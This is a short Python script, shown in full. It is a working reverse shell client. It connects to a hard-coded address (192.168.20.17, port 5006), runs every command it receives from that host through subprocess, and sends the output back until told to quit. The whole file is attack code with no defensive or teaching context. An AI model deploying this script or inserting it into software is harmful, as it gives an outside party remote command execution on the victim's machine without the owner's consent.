import socket
import subprocess
sever = "192.168.20.17"
port = 5006
buffer = 1024
s = socket.socket()
s.connect((sever,port))
while True:
    command = s.recv(buffer).decode()
    if command.lower() == "quit":
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())
s.close()
